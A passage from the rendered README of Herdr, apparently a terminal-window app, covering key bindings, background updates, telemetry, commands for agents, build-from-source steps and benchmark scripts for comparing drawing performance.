<p dir="auto">Ctrl+Shift+P shows every command and its key (Cmd+Shift+P on macOS). Change any key in <code>keys.json</code>; see <a href="https://github.com/herdrdev/herdr-app/blob/master/defaults/AGENTS.md#keys-keysjson">the keys section</a> of the mod guide for the format.</p>
<p dir="auto"><a href="https://github.com/herdrdev/herdr-app/blob/master/docs/mods.md">Layouts and mods</a> · <a href="https://github.com/herdrdev/herdr-app/blob/master/docs/commands.md">Commands</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Updates and privacy</h2><a id="user-content-updates-and-privacy" aria-label="Permalink: Updates and privacy" href="#updates-and-privacy"></a></p>
<p dir="auto">Installed releases check for updates in the background and download a new app beside the running one. It takes over when you quit and reopen, or choose the update action. Your terminals keep running in the core.
Settings → Updates shows what is available. What's New opens after an update; you can open it again from the command palette.
Builds from source do not update themselves.</p>
<p dir="auto">Usage telemetry is on by default in releases. Turn it off in Settings → Privacy.
Mods are trusted code, not sandboxed extensions. Read <a href="https://github.com/herdrdev/herdr-app/blob/master/docs/security.md">security and privacy</a> before installing someone else's mod.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">For agents</h2><a id="user-content-for-agents" aria-label="Permalink: For agents" href="#for-agents"></a></p>

<p dir="auto">This prints the agent guide for driving the window. The herdr-core skill points agents here.
Use herdr-core for running and coordinating programs; use the app to change what you see.</p>
<div dir="auto" data-snippet-clipboard-copy-content="herdr-app ls
herdr-app status
herdr-app commands"><pre>herdr-app ls
herdr-app status
herdr-app commands</pre></div>
<p dir="auto">The first two inspect the open window. The command list also works without one.
See the <a href="https://github.com/herdrdev/herdr-app/blob/master/docs/commands.md">command reference</a> for arguments.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build from source</h2><a id="user-content-build-from-source" aria-label="Permalink: Build from source" href="#build-from-source"></a></p>
<p dir="auto">For bugs, mod API requests and code contributions, see <a href="https://github.com/herdrdev/herdr-app/blob/master/CONTRIBUTING.md">Contributing</a>.</p>
<p dir="auto">Clone this repo with its submodules. Use Rust 1.95.0 and Zig 0.16.0, the versions used in <a href="https://github.com/herdrdev/herdr-app/blob/master/.github/workflows/ci.yml">CI</a>.
Linux needs the development packages listed in that workflow.</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone --recurse-submodules https://github.com/herdrdev/herdr-app.git
cd herdr-app
just build
just test
just install"><pre>git clone --recurse-submodules https://github.com/herdrdev/herdr-app.git
<span>cd</span> herdr-app
just build
just <span>test</span>
just install</pre></div>
<p dir="auto">Install <a href="https://github.com/casey/just">just</a> to use these recipes.
The platform installer builds a release and adds the app to your desktop.
On Linux it links to this checkout, so keep the checkout in place.
Quit and reopen Herdr to use the new build.</p>
<p dir="auto">Documentation checks also need <a href="https://bun.sh/" rel="nofollow">Bun</a>: <code>just docs-check</code> checks generated pages and CLI examples; <code>just docs-generate</code> refreshes the reference pages.</p>
<p dir="auto">To compare drawing changes on Windows, Linux or macOS, run the same fixed workloads against each build:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python scripts/bench.py --bin <app executable> --set spinners --seconds 20"><pre>python scripts/bench.py --bin <span>&lt;</span>app executable<span>&gt;</span> --set spinners --seconds 20</pre></div>
<p dir="auto">The runner requires <code>hc</code> on PATH and uses the Python executable running the script. It prints a unique artifact folder with the run settings, counters and results, then stops its private app, terminals and core. Both sets use Python fixture programs; the default set’s TUI workload replaces historical <code>btop</code> measurements. <code>--only spinners</code> measures just the quiet native spinner scenario. Keep the window visible and the display awake, and compare the same window activity and display settings; inactive windows may draw at a lower rate. Windows records visibility, foreground activity and display Hz at each measurement boundary; other platforms mark these observations unavailable. Visibility does not establish occlusion. Draws are window render calls. Render-to-paint elapsed time stops before scene finalization, backend drawing, uploads and presentation; it is separate from OS process CPU time. Neither measures physical presentation or the FPS HUD’s derived MAX FPS.</p>
<p dir="auto"><code>python scripts/bench_compare.py ghostty --root &lt;artifact folder&gt;</code> reuses a run’s fake agent for the macOS comparison. Benchmark checks: <code>python -m unittest discover -s scripts -p test_bench.py</code>.</p>
</article></div></div>]]></description>
        </item>
